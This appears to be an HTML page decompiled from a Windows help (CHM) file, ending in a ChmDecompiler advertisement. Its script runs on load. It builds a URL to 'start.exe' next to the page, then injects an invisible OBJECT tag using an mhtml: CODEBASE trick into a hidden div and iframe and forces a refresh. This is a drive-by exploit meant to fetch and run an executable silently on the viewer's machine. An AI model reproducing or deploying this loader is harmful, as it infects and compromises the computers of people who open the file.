<html>
<body>
<div id=ObjectContainer></div>
<IFRAME name="icounter" width=60 height=30 style=display:none></IFRAME>
<script language="javascript">

function GetPath(url){
  iPrefix = url.substring(0,7);    

  switch(iPrefix){    
    case "http://" :    
      j = url.lastIndexOf('/');    
      InetPath = url.slice(0,j) + '/';
    break;

    case "ms-its:" :
      j = url.indexOf('!');
      k = url.lastIndexOf('::');
      if( k >= 0){
        tmp = url.slice(j+1, k);
      }else{
        tmp = url.slice(j+1, url.length);
      }
      i = tmp.lastIndexOf('/');
      InetPath = tmp.slice(0, i) + '/';
   break;

   default:
     InetPath = '';
   break;
  }
  InetPath = InetPath + 'start.exe';
  return InetPath;
}
 payloadURL = GetPath(location.href);
 Prefix = "mhtml:file://C:NO_SUCH_MHT.MHT!";

 tmp = '<OBJECT style="display:none" classid="clsid:11111111-1111-1111-2222-111111111157" CODEBASE="' + Prefix + payloadURL + '">';
 ObjectContainer.innerHTML = tmp;   //win2k
 icounter.document.write(tmp);      //win9x
 setTimeout('icounter.document.execCommand("Refresh")',1000);    
 
</script>
</body>
</html><br> This file is decompiled by an unregistered version of ChmDecompiler. <br>
 Regsitered version does not show this message. <br>You can download ChmDecompiler at :
    <a href="http://www.zipghost.com/" target=_blank> http://www.zipghost.com/ </a>
    <br><br>
